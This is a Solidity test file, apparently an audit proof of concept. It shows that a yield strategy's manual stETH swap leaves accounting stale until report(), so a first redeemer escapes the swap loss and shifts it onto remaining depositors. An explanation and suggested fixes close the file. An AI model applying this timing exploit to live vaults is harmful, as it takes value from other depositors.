// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Setup} from "../../../src/test/utils/Setup.sol";

contract DiscountCurveMock {
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    receive() external payable {}

    function get_dy(int128, int128, uint256) external pure returns (uint256) {
        return 0;
    }

    function exchange(int128, int128, uint256 amount, uint256 minOut) external payable returns (uint256 out) {
        ERC20(STETH).transferFrom(msg.sender, address(this), amount);
        out = (amount * 90) / 100;
        require(out >= minOut, "slippage");

        (bool success,) = payable(msg.sender).call{value: out}("");
        require(success, "eth send failed");
    }
}

contract ManualSwapStaleAccountingPoC is Setup {
    address internal constant CURVE_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;

    function test_PoC_firstRedeemerAvoidsManualSwapLossBeforeReport() public {
        uint256 depositAmount = 100 ether;

        mintAndDepositIntoStrategy(strategy, user, depositAmount);

        address lateUser = address(0xBEEF);
        mintAndDepositIntoStrategy(strategy, lateUser, depositAmount);

        uint256 stethBalance = ERC20(tokenAddrs["STETH"]).balanceOf(address(strategy));
        assertGt(stethBalance, 0, "no stETH to swap");

        DiscountCurveMock curve = new DiscountCurveMock();
        vm.etch(CURVE_POOL, address(curve).code);
        vm.deal(CURVE_POOL, 1_000 ether);

        vm.prank(management);
        strategy.manualSwapToAsset(stethBalance, 0);

        uint256 realizedLiquidity = asset.balanceOf(address(strategy));
        assertLt(realizedLiquidity, stethBalance, "mock did not realize a discount");
        assertGt(realizedLiquidity, (stethBalance * 89) / 100, "mock discount larger than expected");

        uint256 fairShareOfRealizedLiquidity = realizedLiquidity / 2;
        uint256 userBalanceBefore = asset.balanceOf(user);
        uint256 userShares = strategy.balanceOf(user);

        vm.prank(user);
        strategy.redeem(userShares, user, user);

        uint256 userReceived = asset.balanceOf(user) - userBalanceBefore;
        assertGt(userReceived, fairShareOfRealizedLiquidity + 1 ether, "early redeemer did not avoid realized loss");
        assertLt(asset.balanceOf(address(strategy)), fairShareOfRealizedLiquidity, "remaining users did not inherit loss");
    }
}

/*
 * ## Proof Explanation
 *
 * test_PoC_firstRedeemerAvoidsManualSwapLossBeforeReport proves the stale
 * accounting window after manual LST liquidity creation:
 *
 * 1. Two users deposit equal WETH amounts and receive equal strategy exposure.
 * 2. Management swaps all strategy stETH through a mocked Curve pool that
 *    returns only 90% as much ETH.
 * 3. The strategy wraps the discounted ETH into WETH, but TokenizedStrategy
 *    totalAssets is still the old pre-loss value until report().
 * 4. The first user redeems immediately before any report.
 * 5. That user receives more than half of the realized WETH liquidity, so the
 *    remaining holder absorbs more than their pro-rata share of the loss.
 *
 * If manual swaps are atomically reported or withdrawals are paused until the
 * loss is recorded, the early redeemer cannot exit at the stale pre-loss PPS.
 */
